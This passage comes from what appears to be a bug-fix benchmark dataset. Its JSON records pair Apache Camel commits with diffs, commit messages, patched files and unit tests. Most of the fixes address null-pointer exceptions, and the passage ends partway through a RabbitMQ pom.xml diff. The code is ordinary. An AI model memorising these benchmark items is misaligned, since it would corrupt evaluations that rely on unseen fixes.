                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java?ref=3c649276475afdfa5cf584194b0acc653118de87",
                "deletions": 1,
                "filename": "components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java",
                "patch": "@@ -277,7 +277,7 @@ public void appendJmsProperty(Message jmsMessage, Exchange exchange, org.apache.\n             Object value = getValidJMSHeaderValue(headerName, headerValue);\n             if (value != null) {\n                 // must encode to safe JMS header name before setting property on jmsMessage\n-                String key = endpoint.getJmsKeyFormatStrategy().encodeKey(headerName);\n+                String key = jmsKeyFormatStrategy.encodeKey(headerName);\n                 jmsMessage.setObjectProperty(key, value);\n             } else if (LOG.isDebugEnabled()) {\n                 // okay the value is not a primitive or string so we cannot sent it over the wire",
                "raw_url": "https://github.com/apache/camel/raw/3c649276475afdfa5cf584194b0acc653118de87/components/camel-jms/src/main/java/org/apache/camel/component/jms/JmsBinding.java",
                "sha": "70efe7a5f81ec02d75c0c7dfeccfe186091ca364",
                "status": "modified"
            }
        ],
        "message": "CAMEL-1492: Fixed NPE when endpoint not pprovided in JmsBinding.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@759071 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/5b0c47c57f8a6b9fddf3ed9fa2196f4ba8ca215d",
        "patched_files": [
            "JmsBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "JmsBindingTest.java"
        ]
    },
    "camel_3cd744d": {
        "bug_id": "camel_3cd744d",
        "commit": "https://github.com/apache/camel/commit/3cd744d6acb245171c27f1d0d3eae63bd86a9438",
        "file": [
            {
                "additions": 9,
                "blob_url": "https://github.com/apache/camel/blob/3cd744d6acb245171c27f1d0d3eae63bd86a9438/components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcEndpoint.java",
                "changes": 36,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcEndpoint.java?ref=3cd744d6acb245171c27f1d0d3eae63bd86a9438",
                "deletions": 27,
                "filename": "components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcEndpoint.java",
                "patch": "@@ -68,81 +68,63 @@ public Exchange createExchange(ExchangePattern pattern) {\n \n     public Exchange createOnPrivmsgExchange(String target, IRCUser user, String msg) {\n         Exchange exchange = createExchange();\n-        IrcMessage im = new IrcMessage(\"PRIVMSG\", target, user, msg);\n-        im.setExchange(exchange);\n-        im.setCamelContext(exchange.getContext());\n+        IrcMessage im = new IrcMessage(getCamelContext(), \"PRIVMSG\", target, user, msg);\n         exchange.setIn(im);\n         return exchange;\n     }\n \n     public Exchange createOnNickExchange(IRCUser user, String newNick) {\n         Exchange exchange = createExchange();\n-        IrcMessage im = new IrcMessage(\"NICK\", user, newNick);\n-        im.setExchange(exchange);\n-        im.setCamelContext(exchange.getContext());\n+        IrcMessage im = new IrcMessage(getCamelContext(), \"NICK\", user, newNick);\n         exchange.setIn(im);\n         return exchange;\n     }\n \n     public Exchange createOnQuitExchange(IRCUser user, String msg) {\n         Exchange exchange = createExchange();\n-        IrcMessage im = new IrcMessage(\"QUIT\", user, msg);\n-        im.setExchange(exchange);\n-        im.setCamelContext(exchange.getContext());\n+        IrcMessage im = new IrcMessage(getCamelContext(), \"QUIT\", user, msg);\n         exchange.setIn(im);\n         return exchange;\n     }\n \n     public Exchange createOnJoinExchange(String channel, IRCUser user) {\n         Exchange exchange = createExchange();\n-        IrcMessage im = new IrcMessage(\"JOIN\", channel, user);\n-        im.setExchange(exchange);\n-        im.setCamelContext(exchange.getContext());\n+        IrcMessage im = new IrcMessage(getCamelContext(), \"JOIN\", channel, user);\n         exchange.setIn(im);\n         return exchange;\n     }\n \n     public Exchange createOnKickExchange(String channel, IRCUser user, String whoWasKickedNick, String msg) {\n         Exchange exchange = createExchange();\n-        IrcMessage im = new IrcMessage(\"KICK\", channel, user, whoWasKickedNick, msg);\n-        im.setExchange(exchange);\n-        im.setCamelContext(exchange.getContext());\n+        IrcMessage im = new IrcMessage(getCamelContext(), \"KICK\", channel, user, whoWasKickedNick, msg);\n         exchange.setIn(im);\n         return exchange;\n     }\n \n     public Exchange createOnModeExchange(String channel, IRCUser user, IRCModeParser modeParser) {\n         Exchange exchange = createExchange();\n-        IrcMessage im = new IrcMessage(\"MODE\", channel, user, modeParser.getLine());\n-        im.setExchange(exchange);\n-        im.setCamelContext(exchange.getContext());\n+        IrcMessage im = new IrcMessage(getCamelContext(), \"MODE\", channel, user, modeParser.getLine());\n         exchange.setIn(im);\n         return exchange;\n     }\n \n     public Exchange createOnPartExchange(String channel, IRCUser user, String msg) {\n         Exchange exchange = createExchange();\n-        IrcMessage im = new IrcMessage(\"PART\", channel, user, msg);\n-        im.setExchange(exchange);\n-        im.setCamelContext(exchange.getContext());\n+        IrcMessage im = new IrcMessage(getCamelContext(), \"PART\", channel, user, msg);\n         exchange.setIn(im);\n         return exchange;\n     }\n \n     public Exchange createOnReplyExchange(int num, String value, String msg) {\n         Exchange exchange = createExchange();\n-        IrcMessage im = new IrcMessage(\"REPLY\", num, value, msg);\n-        im.setExchange(exchange);\n-        im.setCamelContext(exchange.getContext());\n+        IrcMessage im = new IrcMessage(getCamelContext(), \"REPLY\", num, value, msg);\n         exchange.setIn(im);\n         return exchange;\n     }\n \n     public Exchange createOnTopicExchange(String channel, IRCUser user, String topic) {\n         Exchange exchange = createExchange();\n-        IrcMessage im = new IrcMessage(\"TOPIC\", channel, user, topic);\n-        im.setExchange(exchange);\n-        im.setCamelContext(exchange.getContext());\n+        IrcMessage im = new IrcMessage(getCamelContext(), \"TOPIC\", channel, user, topic);\n         exchange.setIn(im);\n         return exchange;\n     }",
                "raw_url": "https://github.com/apache/camel/raw/3cd744d6acb245171c27f1d0d3eae63bd86a9438/components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcEndpoint.java",
                "sha": "ab188d761df9f6a1f56e61831f835754aaa0fbd8",
                "status": "modified"
            },
            {
                "additions": 14,
                "blob_url": "https://github.com/apache/camel/blob/3cd744d6acb245171c27f1d0d3eae63bd86a9438/components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcMessage.java",
                "changes": 23,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcMessage.java?ref=3cd744d6acb245171c27f1d0d3eae63bd86a9438",
                "deletions": 9,
                "filename": "components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcMessage.java",
                "patch": "@@ -18,6 +18,7 @@\n \n import java.util.Map;\n \n+import org.apache.camel.CamelContext;\n import org.apache.camel.Exchange;\n import org.apache.camel.impl.DefaultMessage;\n import org.apache.camel.util.ExchangeHelper;\n@@ -32,25 +33,29 @@\n     private int num;\n     private String value;\n \n-    public IrcMessage() {\n+    public IrcMessage(CamelContext camelContext) {\n+        super(camelContext);\n     }\n \n-    public IrcMessage(String messageType, IRCUser user, String message) {\n+    public IrcMessage(CamelContext camelContext, String messageType, IRCUser user, String message) {\n+        super(camelContext);\n         this.messageType = messageType;\n         this.user = user;\n         this.message = message;\n         setBody(message);\n     }\n \n-    public IrcMessage(String messageType, String target, IRCUser user, String message) {\n+    public IrcMessage(CamelContext camelContext, String messageType, String target, IRCUser user, String message) {\n+        super(camelContext);\n         this.messageType = messageType;\n         this.target = target;\n         this.user = user;\n         this.message = message;\n         setBody(message);\n     }\n \n-    public IrcMessage(String messageType, String target, IRCUser user, String whoWasKickedNick, String message) {\n+    public IrcMessage(CamelContext camelContext, String messageType, String target, IRCUser user, String whoWasKickedNick, String message) {\n+        super(camelContext);\n         this.messageType = messageType;\n         this.target = target;\n         this.user = user;\n@@ -59,13 +64,15 @@ public IrcMessage(String messageType, String target, IRCUser user, String whoWas\n         setBody(message);\n     }\n \n-    public IrcMessage(String messageType, String target, IRCUser user) {\n+    public IrcMessage(CamelContext camelContext, String messageType, String target, IRCUser user) {\n+        super(camelContext);\n         this.messageType = messageType;\n         this.target = target;\n         this.user = user;\n     }\n \n-    public IrcMessage(String messageType, int num, String value, String message) {\n+    public IrcMessage(CamelContext camelContext, String messageType, int num, String value, String message) {\n+        super(camelContext);\n         this.messageType = messageType;\n         this.num = num;\n         this.value = value;\n@@ -122,9 +129,7 @@ protected Object createBody() {\n \n     @Override\n     public IrcMessage newInstance() {\n-        IrcMessage answer = new IrcMessage();\n-        answer.setCamelContext(getCamelContext());\n-        return answer;\n+        return new IrcMessage(getCamelContext());\n     }\n \n     @Override",
                "raw_url": "https://github.com/apache/camel/raw/3cd744d6acb245171c27f1d0d3eae63bd86a9438/components/camel-irc/src/main/java/org/apache/camel/component/irc/IrcMessage.java",
                "sha": "160ee0db4ed8c691665bfc0713818cdcc5653537",
                "status": "modified"
            }
        ],
        "message": "CAMEL-11465: Fixed NPE in IrcMessage after recent optimise in camel-core.",
        "parent": "https://github.com/apache/camel/commit/77713509c8f324c29a271936d35f44779c96a6ab",
        "patched_files": [
            "IrcEndpoint.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "IrcEndpointTest.java"
        ]
    },
    "camel_3eaf375": {
        "bug_id": "camel_3eaf375",
        "commit": "https://github.com/apache/camel/commit/3eaf3754cc1904c3440c3de030cd58a5bf7a9976",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/3eaf3754cc1904c3440c3de030cd58a5bf7a9976/camel-core/src/main/java/org/apache/camel/impl/ScheduledPollConsumer.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/ScheduledPollConsumer.java?ref=3eaf3754cc1904c3440c3de030cd58a5bf7a9976",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/ScheduledPollConsumer.java",
                "patch": "@@ -53,7 +53,7 @@ public ScheduledPollConsumer(DefaultEndpoint endpoint, Processor processor) {\n \n         // TODO: this executor should also be shutdown when CamelContext stops\n         this.executor = endpoint.getCamelContext().getExecutorServiceStrategy()\n-                            .newScheduledThreadPool(this, getEndpoint().getEndpointUri(), DEFAULT_THREADPOOL_SIZE);\n+                            .newScheduledThreadPool(this, endpoint.getEndpointUri(), DEFAULT_THREADPOOL_SIZE);\n         ObjectHelper.notNull(executor, \"executor\");\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/3eaf3754cc1904c3440c3de030cd58a5bf7a9976/camel-core/src/main/java/org/apache/camel/impl/ScheduledPollConsumer.java",
                "sha": "9fad778f642a719092cf7e4a9bb23d3d4edddec3",
                "status": "modified"
            }
        ],
        "message": "CAMEL-1588: Fixed a potential NPE if getEndpoint was overridden\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@922230 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/7681dc1dc955293d186f370206d4bb9a8c34d4fa",
        "patched_files": [
            "ScheduledPollConsumer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ScheduledPollConsumerTest.java"
        ]
    },
    "camel_3ec413d": {
        "bug_id": "camel_3ec413d",
        "commit": "https://github.com/apache/camel/commit/3ec413dc5cc71532aa0fd5176bc347dc2a1ea2a4",
        "file": [
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/3ec413dc5cc71532aa0fd5176bc347dc2a1ea2a4/camel-core/src/main/java/org/apache/camel/processor/RouteContextProcessor.java",
                "changes": 12,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/RouteContextProcessor.java?ref=3ec413dc5cc71532aa0fd5176bc347dc2a1ea2a4",
                "deletions": 6,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/RouteContextProcessor.java",
                "patch": "@@ -27,7 +27,7 @@\n  * This ensures that the {@link Exchange} have details under which route its being currently processed.\n  */\n public class RouteContextProcessor extends DelegateAsyncProcessor {\n-    \n+\n     private final RouteContext routeContext;\n \n     public RouteContextProcessor(RouteContext routeContext, Processor processor) {\n@@ -38,17 +38,17 @@ public RouteContextProcessor(RouteContext routeContext, Processor processor) {\n     @Override\n     protected boolean processNext(final Exchange exchange, final AsyncCallback callback) {\n         // push the current route context\n-        if (exchange.getUnitOfWork() != null) {\n-            exchange.getUnitOfWork().pushRouteContext(routeContext);\n+        final UnitOfWork unitOfWork = exchange.getUnitOfWork();\n+        if (unitOfWork != null) {\n+            unitOfWork.pushRouteContext(routeContext);\n         }\n \n         boolean sync = processor.process(exchange, new AsyncCallback() {\n             public void done(boolean doneSync) {\n                 try {\n-                    UnitOfWork uow = exchange.getUnitOfWork();\n                     // pop the route context we just used\n-                    if (uow != null) {\n-                        uow.popRouteContext();\n+                    if (unitOfWork != null) {\n+                        unitOfWork.popRouteContext();\n                     }\n                 } catch (Exception e) {\n                     exchange.setException(e);",
                "raw_url": "https://github.com/apache/camel/raw/3ec413dc5cc71532aa0fd5176bc347dc2a1ea2a4/camel-core/src/main/java/org/apache/camel/processor/RouteContextProcessor.java",
                "sha": "6a9d98ec72631686c4f967ad9dd1ce8781a94740",
                "status": "modified"
            },
            {
                "additions": 98,
                "blob_url": "https://github.com/apache/camel/blob/3ec413dc5cc71532aa0fd5176bc347dc2a1ea2a4/camel-core/src/test/java/org/apache/camel/processor/RouteContextProcessorTest.java",
                "changes": 98,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/processor/RouteContextProcessorTest.java?ref=3ec413dc5cc71532aa0fd5176bc347dc2a1ea2a4",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/processor/RouteContextProcessorTest.java",
                "patch": "@@ -0,0 +1,98 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.processor;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.Exchange;\n+import org.apache.camel.Processor;\n+import org.apache.camel.ProducerTemplate;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+\n+/**\n+ * @version\n+ */\n+public class RouteContextProcessorTest extends ContextTestSupport {\n+\n+    // Number of concurrent processing threads\n+    public static final int CONCURRENCY = 10;\n+\n+    // Additional resequencer time-out above theoretical time-out\n+    public static final long SAFETY_TIMEOUT = 100;\n+\n+    // Additional resequencer capacity above theoretical capacity\n+    public static final int SAFETY_CAPACITY = 10;\n+\n+    // Resequencer time-out\n+    public static final long TIMEOUT = SAFETY_TIMEOUT\n+            + (RandomSleepProcessor.MAX_PROCESS_TIME - RandomSleepProcessor.MIN_PROCESS_TIME);\n+\n+    // Resequencer capacity\n+    public static final int CAPACITY = SAFETY_CAPACITY\n+            + (int) (CONCURRENCY * TIMEOUT / RandomSleepProcessor.MIN_PROCESS_TIME);\n+\n+    private static final int NUMBER_OF_MESSAGES = 10000;\n+\n+    public void testForkAndJoin() throws InterruptedException {\n+        MockEndpoint mock = getMockEndpoint(\"mock:result\");\n+        mock.expectedMessageCount(NUMBER_OF_MESSAGES);\n+\n+        ProducerTemplate template = context.createProducerTemplate();\n+        for (int i = 0; i < NUMBER_OF_MESSAGES; i++) {\n+            template.sendBodyAndHeader(\"seda:fork\", \"Test Message: \" + i,\n+                    \"seqnum\", new Long(i));\n+        }\n+\n+        long expectedTime = NUMBER_OF_MESSAGES\n+                * (RandomSleepProcessor.MAX_PROCESS_TIME + RandomSleepProcessor.MIN_PROCESS_TIME)\n+                / 2 / CONCURRENCY + TIMEOUT;\n+        Thread.sleep(expectedTime);\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                Processor myProcessor = new RandomSleepProcessor();\n+                from(\"seda:fork?concurrentConsumers=\" + CONCURRENCY).process(\n+                        myProcessor).to(\"seda:join\");\n+                from(\"seda:join\").resequence(header(\"seqnum\")).stream()\n+                        .capacity(CAPACITY).timeout(TIMEOUT).to(\"mock:result\");\n+            }\n+        };\n+    }\n+\n+    /**\n+     * Simulation processor that sleeps a random time between MIN_PROCESS_TIME\n+     * and MAX_PROCESS_TIME milliseconds.\n+     */\n+    public static class RandomSleepProcessor implements Processor {\n+        public static final long MIN_PROCESS_TIME = 5;\n+        public static final long MAX_PROCESS_TIME = 50;\n+\n+        @Override\n+        public void process(Exchange arg0) throws Exception {\n+            long processTime = (long) (MIN_PROCESS_TIME + Math.random()\n+                    * (MAX_PROCESS_TIME - MIN_PROCESS_TIME));\n+            Thread.sleep(processTime);\n+        }\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/3ec413dc5cc71532aa0fd5176bc347dc2a1ea2a4/camel-core/src/test/java/org/apache/camel/processor/RouteContextProcessorTest.java",
                "sha": "1f05291a893dff09f567f78daade1fe3d903bd05",
                "status": "added"
            }
        ],
        "message": "CAMEL-5925: Fixed potential NPE in RouteContextProcessor. Thanks to Taariq Levack for the patch.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1429218 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/9e45aa2a13e803f302c5bb387a113fd1752aae61",
        "patched_files": [
            "RouteContextProcessor.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "RouteContextProcessorTest.java"
        ]
    },
    "camel_4093fe5": {
        "bug_id": "camel_4093fe5",
        "commit": "https://github.com/apache/camel/commit/4093fe50ad947be352a7450bb8bda14f168973ee",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/4093fe50ad947be352a7450bb8bda14f168973ee/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfEndpoint.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfEndpoint.java?ref=4093fe50ad947be352a7450bb8bda14f168973ee",
                "deletions": 2,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfEndpoint.java",
                "patch": "@@ -509,8 +509,6 @@ protected void setupClientFactoryBean(ClientFactoryBean factoryBean, Class<?> cl\n         if (getServiceName() != null) {\n             factoryBean.setServiceName(getServiceName());\n         }\n-        \n-        \n \n         // port name qname\n         if (getPortName() != null) {\n@@ -560,6 +558,9 @@ protected void setupClientFactoryBean(ClientFactoryBean factoryBean, Class<?> cl\n             AuthorizationPolicy authPolicy = new AuthorizationPolicy();\n             authPolicy.setUserName(username);\n             authPolicy.setPassword(password);\n+            if (factoryBean.getProperties() == null) {\n+                factoryBean.setProperties(new HashMap<String, Object>());\n+            }\n             factoryBean.getProperties().put(AuthorizationPolicy.class.getName(), authPolicy);\n         }\n         ",
                "raw_url": "https://github.com/apache/camel/raw/4093fe50ad947be352a7450bb8bda14f168973ee/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/CxfEndpoint.java",
                "sha": "b21bfbee3a5a35cd6762b93c29cf41341cc0ef24",
                "status": "modified"
            }
        ],
        "message": "CAMEL-10708: Fixed potential NPE when setting username/password",
        "parent": "https://github.com/apache/camel/commit/1562121d4c089ed346ea2994008ec2c74ac50e8f",
        "patched_files": [
            "CxfEndpoint.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CxfEndpointTest.java"
        ]
    },
    "camel_40da05c": {
        "bug_id": "camel_40da05c",
        "commit": "https://github.com/apache/camel/commit/40da05c77cd7c0411d6168e06a65e4808940056c",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/40da05c77cd7c0411d6168e06a65e4808940056c/camel-core/src/main/java/org/apache/camel/builder/ProxyBuilder.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/builder/ProxyBuilder.java?ref=40da05c77cd7c0411d6168e06a65e4808940056c",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/builder/ProxyBuilder.java",
                "patch": "@@ -19,6 +19,7 @@\n import org.apache.camel.CamelContext;\n import org.apache.camel.Endpoint;\n import org.apache.camel.component.bean.ProxyHelper;\n+import org.apache.camel.util.ObjectHelper;\n \n /**\n  * A build to create Camel proxies.\n@@ -64,6 +65,7 @@ public ProxyBuilder endpoint(Endpoint endpoint) {\n      * @throws Exception is thrown if error creating the proxy\n      */\n     public <T> T build(Class<T>... interfaceClasses) throws Exception {\n+        ObjectHelper.notNull(endpoint, \"endpoint\");\n         return ProxyHelper.createProxy(endpoint, interfaceClasses);\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/40da05c77cd7c0411d6168e06a65e4808940056c/camel-core/src/main/java/org/apache/camel/builder/ProxyBuilder.java",
                "sha": "5b8a8c86641902d6c5d34725c9f1970afacda8bb",
                "status": "modified"
            },
            {
                "additions": 48,
                "blob_url": "https://github.com/apache/camel/blob/40da05c77cd7c0411d6168e06a65e4808940056c/camel-core/src/test/java/org/apache/camel/impl/CamelProduceInterfaceTest.java",
                "changes": 48,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/impl/CamelProduceInterfaceTest.java?ref=40da05c77cd7c0411d6168e06a65e4808940056c",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/impl/CamelProduceInterfaceTest.java",
                "patch": "@@ -0,0 +1,48 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.impl;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.builder.ProxyBuilder;\n+import org.apache.camel.builder.RouteBuilder;\n+\n+/**\n+ *\n+ */\n+public class CamelProduceInterfaceTest extends ContextTestSupport {\n+\n+    private Echo echo;\n+\n+    public void testCamelProduceInterface() throws Exception {\n+        String reply = echo.hello(\"Camel\");\n+        assertEquals(\"Hello Camel\", reply);\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                // we gotta cheat and use proxy builder as ContextTestSupport doesnt do\n+                // all the IoC wiring we need when using @Produce on an interface\n+                echo = new ProxyBuilder(context).endpoint(\"direct:hello\").build(Echo.class);\n+\n+                from(\"direct:hello\").transform(body().prepend(\"Hello \"));\n+            }\n+        };\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/40da05c77cd7c0411d6168e06a65e4808940056c/camel-core/src/test/java/org/apache/camel/impl/CamelProduceInterfaceTest.java",
                "sha": "f7df2ba4d61c078ea466cde780f5985c4e4f01c3",
                "status": "added"
            },
            {
                "additions": 29,
                "blob_url": "https://github.com/apache/camel/blob/40da05c77cd7c0411d6168e06a65e4808940056c/camel-core/src/test/java/org/apache/camel/impl/Echo.java",
                "changes": 29,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/impl/Echo.java?ref=40da05c77cd7c0411d6168e06a65e4808940056c",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/impl/Echo.java",
                "patch": "@@ -0,0 +1,29 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.impl;\n+\n+import org.apache.camel.Produce;\n+\n+/**\n+ *\n+ */\n+public interface Echo {\n+\n+    @Produce(uri = \"direct:hello\")\n+    String hello(String name);\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/40da05c77cd7c0411d6168e06a65e4808940056c/camel-core/src/test/java/org/apache/camel/impl/Echo.java",
                "sha": "e55aa621ee3b50562e05a3ce8db5fe9c9fb2238a",
                "status": "added"
            }
        ],
        "message": "Added check for NPE\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1085284 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/030753f46da669b95225a004f4d4123545205dd3",
        "patched_files": [
            "Echo.java",
            "ProxyBuilder.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ProxyBuilderTest.java",
            "CamelProduceInterfaceTest.java"
        ]
    },
    "camel_423d2e8": {
        "bug_id": "camel_423d2e8",
        "commit": "https://github.com/apache/camel/commit/423d2e8f26eb1bd7c69900aaa603b897c55c144a",
        "file": [
            {
                "additions": 68,
                "blob_url": "https://github.com/apache/camel/blob/423d2e8f26eb1bd7c69900aaa603b897c55c144a/components/camel-rabbitmq/pom.xml",
                "changes": 130,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-rabbitmq/pom.xml?ref=423d2e8f26eb1bd7c69900aaa603b897c55c144a",
                "deletions": 62,
                "filename": "components/camel-rabbitmq/pom.xml",
                "patch": "@@ -15,7 +15,8 @@\n     See the License for the specific language governing permissions and\n     limitations under the License.\n   -->\n-<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd\">\n+<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n+         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd\">\n   <modelVersion>4.0.0</modelVersion>\n \n   <parent>\n@@ -29,70 +30,75 @@\n   <packaging>bundle</packaging>\n   <name>Camel :: RabbitMQ</name>\n   <description>Camel RabbitMQ Component</description>\n-  \n+\n   <properties>\n-        <camel.osgi.export.pkg>\n-            org.apache.camel.component.rabbitmq.*\n-        </camel.osgi.export.pkg>\n-        <camel.osgi.export.service>org.apache.camel.spi.ComponentResolver;component=rabbitmq</camel.osgi.export.service>\n+    <camel.osgi.export.pkg>\n+      org.apache.camel.component.rabbitmq.*\n+    </camel.osgi.export.pkg>\n+    <camel.osgi.export.service>org.apache.camel.spi.ComponentResolver;component=rabbitmq</camel.osgi.export.service>\n   </properties>\n \n-    <dependencies>\n-        <dependency>\n-            <groupId>com.rabbitmq</groupId>\n-            <artifactId>amqp-client</artifactId>\n-            <version>${rabbitmq-amqp-client-version}</version>\n-        </dependency>\n-        <dependency>\n-            <groupId>org.apache.camel</groupId>\n-            <artifactId>camel-core</artifactId>\n-        </dependency>\n-        \n-        <!-- testing -->\n-        <dependency>\n-            <groupId>org.apache.camel</groupId>\n-            <artifactId>camel-test</artifactId>\n- \t    <scope>test</scope>\n-        </dependency>\n-        <dependency>\n-            <groupId>org.mockito</groupId>\n-            <artifactId>mockito-core</artifactId>\n-            <scope>test</scope>\n-        </dependency>\n-    </dependencies>\n-    \n-    <build>\n-         <plugins>\n-             <plugin>\n-                <artifactId>maven-surefire-plugin</artifactId>\n-                <configuration>\n-                    <excludes>\n-                        <exclude>**/*IntTest*</exclude>\n-                    </excludes>\n-                </configuration>\n-            </plugin>\n-        </plugins>\n-    </build>\n+  <dependencies>\n+    <dependency>\n+      <groupId>com.rabbitmq</groupId>\n+      <artifactId>amqp-client</artifactId>\n+      <version>${rabbitmq-amqp-client-version}</version>\n+    </dependency>\n+    <dependency>\n+      <groupId>org.apache.camel</groupId>\n+      <artifactId>camel-core</artifactId>\n+    </dependency>\n \n-    <profiles>\n-        <profile>\n-            <id>itest</id>\n-            <build>\n-                <plugins>\n-                    <plugin>\n-                        <artifactId>maven-surefire-plugin</artifactId>\n-                        <configuration>\n-                            <excludes>\n-                                <exclude>None</exclude>\n-                            </excludes>\n-                            <includes>\n-                                <include>**/*IntTest*</include>\n-                            </includes>\n-                        </configuration>\n-                    </plugin>\n-                </plugins>\n-            </build>\n-        </profile>\n-    </profiles>\n+    <!-- testing -->\n+    <dependency>\n+      <groupId>org.apache.camel</groupId>\n+      <artifactId>camel-test</artifactId>\n+      <scope>test</scope>\n+    </dependency>\n+    <dependency>\n+      <groupId>org.mockito</groupId>\n+      <artifactId>mockito-core</artifactId>\n+      <scope>test</scope>\n+    </dependency>\n+    <dependency>\n+      <groupId>org.slf4j</groupId>\n+      